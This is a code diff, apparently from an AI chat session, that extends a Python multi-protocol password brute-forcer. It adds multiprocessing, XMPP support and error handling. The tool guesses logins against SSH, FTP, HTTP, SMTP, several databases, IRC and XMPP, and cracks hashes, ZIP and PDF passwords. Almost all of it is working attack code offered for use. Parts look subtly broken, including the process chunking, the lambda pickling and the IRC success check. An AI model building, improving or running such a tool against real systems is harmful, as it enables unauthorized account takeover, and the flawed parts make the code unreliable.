@@ -1,9 +1,7 @@
-Copilot Chat
-New conversation
-You said: #!/usr/bin/env python3 import argparse import threading import queue import socket import sys import
 #!/usr/bin/env python3
 import argparse
 import threading
+import multiprocessing
 import queue
 import socket
 import sys
@@ -17,13 +15,10 @@ import smtplib         # SMTP
 import pymysql         # MySQL
 import psycopg2        # PostgreSQL
 import pymssql         # MS SQL
-import xmpp            # XMPP (using sleekxmpp or alternative)
+import slixmpp         # XMPP (modern and maintained)
 import hashlib         # for hash check
 import zipfile         # ZIP bruteforce
 import PyPDF2          # PDF password check
-
-# For demonstration, not all imports may be installed by default
-# xmpp and some DB libs may require installation by user.
 
 # ----------- Helper Functions ------------
 
@@ -31,19 +26,26 @@ def print_dbg(msg, debug):
     if debug:
         print(msg)
 
-# ----------- Brute force worker ------------
+def print_error(msg, debug):
+    print(f"[!] {msg}")
+    if debug:
+        import traceback
+        traceback.print_exc()
+
+# ----------- Brute force worker (threaded & multiproc) ------------
 
 class BruteForceWorker(threading.Thread):
-    def __init__(self, target_func, username_queue, password_queue, debug=False):
+    def __init__(self, target_func, username_queue, password_queue, debug=False, result_flag=None):
         super().__init__()
         self.target_func = target_func
         self.username_queue = username_queue
         self.password_queue = password_queue
         self.debug = debug
         self.found = False
+        self.result_flag = result_flag
 
     def run(self):
-        while not self.found:
+        while not (self.found or (self.result_flag and self.result_flag.is_set())):
             try:
                 username = self.username_queue.get_nowait()
             except queue.Empty:
@@ -53,18 +55,32 @@ class BruteForceWorker(threading.Thread):
                     password = self.password_queue.get_nowait()
                 except queue.Empty:
                     break
-                # Call target function with username and password
-                success = self.target_func(username, password)
+                try:
+                    success = self.target_func(username, password)
+                except Exception as e:
+                    print_error(f"Unexpected error for {username}:{password} - {str(e)}", self.debug)
+                    continue
                 if success:
                     print(f"[+] Found credentials! {username}:{password}")
                     self.found = True
+                    if self.result_flag:
+                        self.result_flag.set()
                     # Put back unused items to avoid blocking other threads
                     self.username_queue.put(username)
                     return
                 else:
                     print_dbg(f"[-] Failed {username}:{password}", self.debug)
 
-# ----------- Protocol bruteforce implementations ------------
+# ----------- Protocol bruteforce implementations with error handling ------------
+
+def is_connection_refused(e):
+    return (
+        isinstance(e, ConnectionRefusedError)
+        or "refused" in str(e).lower()
+        or "connection closed" in str(e).lower()
+        or "timed out" in str(e).lower()
+        or "broken pipe" in str(e).lower()
+    )
 
 # SSH
 def ssh_bruteforce(username, password, target_ip, debug=False):
@@ -74,8 +90,14 @@ def ssh_bruteforce(username, password, target_ip, debug=False):
         ssh.connect(target_ip, username=username, password=password, timeout=5)
         ssh.close()
         return True
+    except paramiko.ssh_exception.AuthenticationException:
+        print_dbg(f"SSH fail: {username}:{password} -> authentication failed", debug)
+        return False
     except Exception as e:
-        print_dbg(f"SSH fail: {username}:{password} -> {e}", debug)
+        if is_connection_refused(e):
+            print_error(f"SSH connection refused or timed out for {target_ip}", debug)
+        else:
+            print_dbg(f"SSH fail: {username}:{password} -> {e}", debug)
         return False
 
 # FTP
@@ -86,22 +108,29 @@ def ftp_bruteforce(username, password, target_ip, debug=False):
         ftp.login(user=username, passwd=password)
         ftp.quit()
         return True
+    except ftplib.error_perm as e:
+        print_dbg(f"FTP fail: {username}:{password} -> permission error", debug)
+        return False
     except Exception as e:
-        print_dbg(f"FTP fail: {username}:{password} -> {e}", debug)
+        if is_connection_refused(e):
+            print_error(f"FTP connection refused or timed out for {target_ip}", debug)
+        else:
+            print_dbg(f"FTP fail: {username}:{password} -> {e}", debug)
         return False
 
 # HTTP/HTTPS
 def http_bruteforce(username, password, target_url, debug=False):
-    # This is a basic POST example - users can customize for their login form
     login_data = {'username': username, 'password': password}
     try:
-        # POST login attempt
         r = requests.post(target_url, data=login_data, timeout=5)
         if "login failed" not in r.text.lower():
             return True
         else:
             print_dbg(f"HTTP fail: {username}:{password}", debug)
             return False
+    except requests.exceptions.ConnectionError as e:
+        print_error(f"HTTP connection refused or timed out for {target_url}", debug)
+        return False
     except Exception as e:
         print_dbg(f"HTTP error: {e}", debug)
         return False
@@ -117,8 +146,14 @@ def smtp_bruteforce(username, password, smtp_server, port=25, use_ssl=False, deb
         server.login(username, password)
         server.quit()
         return True
+    except smtplib.SMTPAuthenticationError:
+        print_dbg(f"SMTP fail: {username}:{password} -> authentication failed", debug)
+        return False
     except Exception as e:
-        print_dbg(f"SMTP fail: {username}:{password} -> {e}", debug)
+        if is_connection_refused(e):
+            print_error(f"SMTP connection refused or timed out for {smtp_server}:{port}", debug)
+        else:
+            print_dbg(f"SMTP fail: {username}:{password} -> {e}", debug)
         return False
 
 # MySQL
@@ -127,8 +162,21 @@ def mysql_bruteforce(username, password, target_ip, port=3306, debug=False):
         conn = pymysql.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
         conn.close()
         return True
+    except pymysql.err.OperationalError as e:
+        if "Access denied" in str(e):
+            print_dbg(f"MySQL fail: {username}:{password} -> access denied", debug)
+            return False
+        elif is_connection_refused(e):
+            print_error(f"MySQL connection refused or timed out for {target_ip}:{port}", debug)
+            return False
+        else:
+            print_dbg(f"MySQL fail: {username}:{password} -> {e}", debug)
+            return False
     except Exception as e:
-        print_dbg(f"MySQL fail: {username}:{password} -> {e}", debug)
+        if is_connection_refused(e):
+            print_error(f"MySQL connection refused or timed out for {target_ip}:{port}", debug)
+        else:
+            print_dbg(f"MySQL fail: {username}:{password} -> {e}", debug)
         return False
 
 # PostgreSQL
@@ -137,8 +185,21 @@ def postgres_bruteforce(username, password, target_ip, port=5432, debug=False):
         conn = psycopg2.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
         conn.close()
         return True
+    except psycopg2.OperationalError as e:
+        if "authentication failed" in str(e).lower():
+            print_dbg(f"PostgreSQL fail: {username}:{password} -> authentication failed", debug)
+            return False
+        elif is_connection_refused(e):
+            print_error(f"PostgreSQL connection refused or timed out for {target_ip}:{port}", debug)
+            return False
+        else:
+            print_dbg(f"PostgreSQL fail: {username}:{password} -> {e}", debug)
+            return False
     except Exception as e:
-        print_dbg(f"PostgreSQL fail: {username}:{password} -> {e}", debug)
+        if is_connection_refused(e):
+            print_error(f"PostgreSQL connection refused or timed out for {target_ip}:{port}", debug)
+        else:
+            print_dbg(f"PostgreSQL fail: {username}:{password} -> {e}", debug)
         return False
 
 # MSSQL
@@ -147,8 +208,21 @@ def mssql_bruteforce(username, password, target_ip, port=1433, debug=False):
         conn = pymssql.connect(server=target_ip, user=username, password=password, port=port, timeout=5)
         conn.close()
         return True
+    except pymssql.OperationalError as e:
+        if "login failed" in str(e).lower():
+            print_dbg(f"MSSQL fail: {username}:{password} -> login failed", debug)
+            return False
+        elif is_connection_refused(e):
+            print_error(f"MSSQL connection refused or timed out for {target_ip}:{port}", debug)
+            return False
+        else:
+            print_dbg(f"MSSQL fail: {username}:{password} -> {e}", debug)
+            return False
     except Exception as e:
-        print_dbg(f"MSSQL fail: {username}:{password} -> {e}", debug)
+        if is_connection_refused(e):
+            print_error(f"MSSQL connection refused or timed out for {target_ip}:{port}", debug)
+        else:
+            print_dbg(f"MSSQL fail: {username}:{password} -> {e}", debug)
         return False
 
 # IRC (simplified: connect with password if needed)
@@ -159,11 +233,53 @@ def irc_bruteforce(username, password, target_ip, port=6667, debug=False):
         s.connect((target_ip, port))
         s.send(f"PASS {password}\r\n".encode())
         s.send(f"NICK {username}\r\n".encode())
-        # No full IRC protocol validation here
         s.close()
         return True  # Assume success if no exception
     except Exception as e:
-        print_dbg(f"IRC fail: {username}:{password} -> {e}", debug)
+        if is_connection_refused(e):
+            print_error(f"IRC connection refused or timed out for {target_ip}:{port}", debug)
+        else:
+            print_dbg(f"IRC fail: {username}:{password} -> {e}", debug)
+        return False
+
+# XMPP (using slixmpp)
+class XmppBrute(slixmpp.ClientXMPP):
+    def __init__(self, jid, password):
+        super().__init__(jid, password)
+        self.success = False
+        self.add_event_handler("session_start", self.start)
+        self.add_event_handler("failed_auth", self.failed)
+        self.add_event_handler("disconnected", self.disconnected)
+        self.connect_error = None
+
+    async def start(self, event):
+        self.success = True
+        self.disconnect()
+
+    async def failed(self, event):
+        self.success = False
+        self.disconnect()
+
+    async def disconnected(self, event):
+        pass
+
+def xmpp_bruteforce(username, password, target_ip, port=5222, debug=False):
+    jid = username # Should be a full JID like user@domain
+    xmpp = XmppBrute(jid, password)
+    try:
+        # Connect to a specific server/port
+        if xmpp.connect((target_ip, port), use_tls=True):
+            xmpp.process(forever=False, timeout=5)
+            if xmpp.success:
+                return True
+            else:
+                print_dbg(f"XMPP fail: {username}:{password} -> authentication failed", debug)
+                return False
+        else:
+            print_error(f"XMPP connection refused or timed out for {target_ip}:{port}", debug)
+            return False
+    except Exception as e:
+        print_dbg(f"XMPP error {username}:{password} -> {e}", debug)
         return False
 
 # Hash bruteforce (only password list, no username)
@@ -221,7 +337,24 @@ def pdf_bruteforce(pdf_path, password_list, debug=False):
         print(f"[-] PDF file error: {e}")
         return None
 
-# Add more protocol bruteforcing functions as needed...
+# ----------- Multiprocessing BruteForce Manager ------------
+
+def multi_worker(target_func, usernames, passwords, debug, result_flag):
+    username_queue = queue.Queue()
+    password_queue = queue.Queue()
+    for u in usernames:
+        if u is not None:
+            username_queue.put(u)
+    for p in passwords:
+        password_queue.put(p)
+
+    threads = []
+    for _ in range(4):  # 4 threads per process (tunable)
+        t = BruteForceWorker(target_func, username_queue, password_queue, debug=debug, result_flag=result_flag)
+        threads.append(t)
+        t.start()
+    for t in threads:
+        t.join()
 
 # ----------- Main CLI ------------
 
@@ -251,7 +384,6 @@ def main():
             print(f"[-] Could not open userlist: {e}")
             sys.exit(1)
     else:
-        # For hash or file bruteforce, username is not needed
         usernames = [None]
 
     # Load passwords
@@ -272,12 +404,7 @@ def main():
     target_ip = None
     target_port = args.port
 
-    # Handle protocol-specific parsing
-    # Some protocols like mysql://ip:port, smtp://server, http://url
-
-    # Simple target_ip extraction:
     if proto in ["ssh", "ftp", "smb", "xmpp", "irc", "oracle", "mssql", "postgres"]:
-        # ip or ip:port
         if ":" in target_rest:
             ip, port_str = target_rest.split(":", 1)
             target_ip = ip
@@ -289,7 +416,6 @@ def main():
         else:
             target_ip = target_rest
     elif proto in ["mysql"]:
-        # mysql://ip:port
         if ":" in target_rest:
             ip, port_str = target_rest.split(":", 1)
             target_ip = ip
@@ -298,7 +424,6 @@ def main():
         else:
             target_ip = target_rest
     elif proto in ["smtp"]:
-        # smtp server domain or ip
         target_ip = target_rest
         if not target_port:
             target_port = 465 if args.ssl else 25
@@ -310,26 +435,13 @@ def main():
         print(f"[-] Unsupported protocol: {proto}")
         sys.exit(1)
 
-    # Create queues for threading
-    username_queue = queue.Queue()
-    password_queue = queue.Queue()
-
-    for u in usernames:
-        if u is not None:
-            username_queue.put(u)
-    for p in passwords:
-        password_queue.put(p)
-
     # Select target function based on protocol
-    def dummy_target(username, password):
-        return False
-
     if proto == "ssh":
         target_func = lambda u, p: ssh_bruteforce(u, p, target_ip, debug=args.dbg)
     elif proto == "ftp":
         target_func = lambda u, p: ftp_bruteforce(u, p, target_ip, debug=args.dbg)
     elif proto == "http" or proto == "https":
-        target_func = lambda u, p: http_bruteforce(u, target, debug=args.dbg)
+        target_func = lambda u, p: http_bruteforce(u, p, target, debug=args.dbg)
     elif proto == "smtp":
         target_func = lambda u, p: smtp_bruteforce(u, p, target_ip, port=target_port, use_ssl=args.ssl, debug=args.dbg)
     elif proto == "mysql":
@@ -340,8 +452,9 @@ def main():
         target_func = lambda u, p: mssql_bruteforce(u, p, target_ip, port=target_port or 1433, debug=args.dbg)
     elif proto == "irc":
         target_func = lambda u, p: irc_bruteforce(u, p, target_ip, port=target_port or 6667, debug=args.dbg)
+    elif proto == "xmpp":
+        target_func = lambda u, p: xmpp_bruteforce(u, p, target_ip, port=target_port or 5222, debug=args.dbg)
     elif proto == "hash":
-        # offline hash cracking
         if not args.file:
             print("[-] For hash bruteforce, provide -f hash_file")
             sys.exit(1)
@@ -369,15 +482,29 @@ def main():
         print(f"[-] Protocol {proto} not implemented.")
         sys.exit(1)
 
-    # Launch threads
-    workers = []
-    for i in range(args.threads):
-        w = BruteForceWorker(target_func, username_queue, password_queue, debug=args.dbg)
-        workers.append(w)
-        w.start()
+    # ----------- Multiprocessing for speed -----------
+    num_procs = max(1, args.threads // 4)
+    manager = multiprocessing.Manager()
+    result_flag = manager.Event()
 
-    for w in workers:
-        w.join()
+    chunk_size = len(passwords) // num_procs
+    password_chunks = [passwords[i*chunk_size:(i+1)*chunk_size] for i in range(num_procs)]
+    if len(password_chunks) < num_procs:
+        password_chunks += [[] for _ in range(num_procs - len(password_chunks))]
+    if password_chunks and sum(len(x) for x in password_chunks) < len(passwords):
+        password_chunks[-1].extend(passwords[sum(len(x) for x in password_chunks):])
+
+    procs = []
+    for i in range(num_procs):
+        p = multiprocessing.Process(
+            target=multi_worker,
+            args=(target_func, usernames, password_chunks[i], args.dbg, result_flag)
+        )
+        procs.append(p)
+        p.start()
+
+    for p in procs:
+        p.join()
 
     print("[*] Brute force finished.")
 
